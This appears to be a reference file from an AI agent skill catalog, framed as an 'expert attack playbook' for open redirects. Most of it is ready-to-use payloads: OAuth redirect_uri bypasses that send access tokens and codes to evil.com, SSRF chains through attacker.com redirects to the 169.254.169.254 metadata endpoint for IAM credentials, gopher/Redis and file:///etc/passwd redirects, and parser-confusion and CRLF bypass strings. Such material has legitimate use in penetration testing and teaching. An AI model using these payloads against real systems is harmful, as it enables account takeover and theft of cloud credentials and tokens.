# SKILL: Open Redirect — Expert Attack Playbook: detailed technique reference

<!-- zhiyugo:resource:start -->
> ZhiyuGo reference material only. Inspect it explicitly through catalog resource tooling when the main Skill names this file; examples do not grant tools, authorization, or evidence.
<!-- zhiyugo:resource:end -->

<!-- zhiyugo:toc:start -->
## Contents

- [7. OPEN REDIRECT → OAUTH TOKEN THEFT (DETAILED CHAINS)](#7-open-redirect-oauth-token-theft-detailed-chains)
- [8. OPEN REDIRECT → SSRF CHAIN](#8-open-redirect-ssrf-chain)
- [9. URL PARSER CONFUSION FOR REDIRECT BYPASS](#9-url-parser-confusion-for-redirect-bypass)
<!-- zhiyugo:toc:end -->

## 7. OPEN REDIRECT → OAUTH TOKEN THEFT (DETAILED CHAINS)

### 7.1 OAuth Implicit Flow

In the implicit flow, the access token is returned in the URL fragment (`#access_token=...`). If `redirect_uri` allows an open redirect on the authorized domain:

```text
/authorize?response_type=token
  &client_id=CLIENT
  &redirect_uri=https://target.com/callback/../redirect?url=https://evil.com
  &scope=read

Flow:
1. User authenticates → authorization server redirects to:
   https://target.com/redirect?url=https://evil.com#access_token=SECRET
2. Open redirect fires → browser navigates to:
   https://evil.com#access_token=SECRET
3. Attacker page reads location.hash → captures access token
```

### 7.2 Authorization Code Flow

The authorization code is sent as a query parameter. If the redirect chain preserves query parameters:

```text
/authorize?response_type=code
  &client_id=CLIENT
  &redirect_uri=https://target.com/callback%2f..%2fredirect%3furl%3dhttps://evil.com

Flow:
1. Authorization server validates redirect_uri prefix → matches https://target.com/
2. Redirects to: https://target.com/redirect?url=https://evil.com&code=AUTH_CODE
3. Open redirect sends victim to: https://evil.com?code=AUTH_CODE
4. Attacker exchanges code for access token
```

### 7.3 OIDC id_token Fragment Leak

```text
/authorize?response_type=id_token
  &client_id=CLIENT
  &redirect_uri=https://target.com/cb
  &nonce=NONCE

If redirect_uri points to open redirect endpoint:
→ id_token in fragment sent to attacker
→ Attacker has signed identity assertion
→ Can authenticate as victim on any RP accepting this IdP
```

### 7.4 redirect_uri validation bypass patterns

```text
redirect_uri=https://target.com/callback/../open-redirect?url=evil.com
redirect_uri=https://target.com/callback?next=https://evil.com
redirect_uri=https://target.com/callback%23@evil.com
redirect_uri=https://target.com/callback/../../redirect
redirect_uri=https://target.com/callback#@evil.com
```

---

## 8. OPEN REDIRECT → SSRF CHAIN

### Server-side redirect following

When a server-side component follows HTTP redirects (e.g., URL preview, link unfurler, webhook, image fetcher):

```text
1. Submit URL to server-side fetcher: http://attacker.com/redirect
2. attacker.com responds: 302 Location: http://169.254.169.254/latest/meta-data/
3. Server follows redirect → SSRF to cloud metadata endpoint
4. Response (IAM credentials) returned to attacker or visible in preview
```

### Multi-hop redirect for filter bypass

```text
1. Server blocks direct requests to 169.254.169.254
2. Submit: http://attacker.com/r1
3. r1 → 302 → http://attacker.com/r2  (same domain, passes filter)
4. r2 → 302 → http://169.254.169.254/ (internal, filter not re-checked)
```

### DNS rebinding variant

```text
1. attacker.com resolves to attacker's public IP (TTL=0)
2. Server resolves attacker.com → public IP → passes SSRF filter
3. Connection established, but HTTP redirect points to attacker.com again
4. Second DNS resolution: attacker.com now resolves to 169.254.169.254
5. Server follows redirect to internal address
```

### Scope escalation via redirect protocols

```text
http://attacker.com/redirect → gopher://127.0.0.1:6379/...  (Redis SSRF)
http://attacker.com/redirect → file:///etc/passwd            (local file read)
http://attacker.com/redirect → dict://127.0.0.1:11211/       (Memcached)
```

Not all HTTP clients follow cross-protocol redirects, but `curl` (default) and some libraries do.

---

## 9. URL PARSER CONFUSION FOR REDIRECT BYPASS

When a redirect validation function parses the URL differently from the browser or server that ultimately processes it:

### Protocol-relative URL

```text
//attacker.com
→ Browser: https://attacker.com (inherits current page protocol)
→ Some validators: relative path "/attacker.com" (wrong)
```

### Backslash confusion

```text
\/\/attacker.com
/\/attacker.com
→ Many browsers normalize \ to / in URLs
→ Validators treating \ as path character may allow it
```

### Userinfo section abuse

```text
//attacker.com\@target.com
→ Browser: navigates to attacker.com (@ is userinfo delimiter)
→ Validator sees "target.com" in the string → passes allowlist check

//target.com@attacker.com
→ Browser: userinfo=target.com, host=attacker.com
→ Validator checks "starts with target.com" → passes

https://target.com%2F@attacker.com
→ URL-decoded: target.com/ as userinfo, host=attacker.com
```

### Double encoding

```text
//attacker%252ecom
→ First decode: //attacker%2ecom (passes validator)
→ Second decode (by server/browser): //attacker.com (actual redirect)
```

### CRLF injection + redirect

```text
/%0d%0aLocation:%20https://attacker.com
→ If server reflects the path in a header context:
   HTTP/1.1 302 Found
   Location: /
   Location: https://attacker.com  ← injected header wins
```

### Fragment confusion

```text
https://target.com#@attacker.com
→ Browser: host=target.com, fragment=@attacker.com
→ But some JS-based redirects: window.location = url → may process differently

https://attacker.com#.target.com
→ Validator: sees "target.com" in string → passes
→ Browser: navigates to attacker.com (fragment ignored in navigation)
```

### Special characters

```text
https://attacker.com%E3%80%82target.com
→ Unicode ideographic full stop (U+3002) — some parsers treat as dot
→ Browser may normalize differently than validator

https://attacker。com    (U+3002 fullwidth period)
https://attacker．com    (U+FF0E fullwidth full stop)
```

### Combined URL parser differential table

| Payload | Validator Sees | Browser Navigates To |
|---------|---------------|---------------------|
| `//evil.com` | Relative path | `https://evil.com` |
| `\/\/evil.com` | Path `\/\/evil.com` | `https://evil.com` |
| `//evil.com\@target.com` | Contains `target.com` | `https://evil.com` |
| `//target.com@evil.com` | Starts with `target.com` | `https://evil.com` |
| `/%0d%0aLocation: https://evil.com` | Path string | Header injection → redirect |
| `//evil%252ecom` | `evil%2ecom` (not a domain) | `evil.com` (after double decode) |
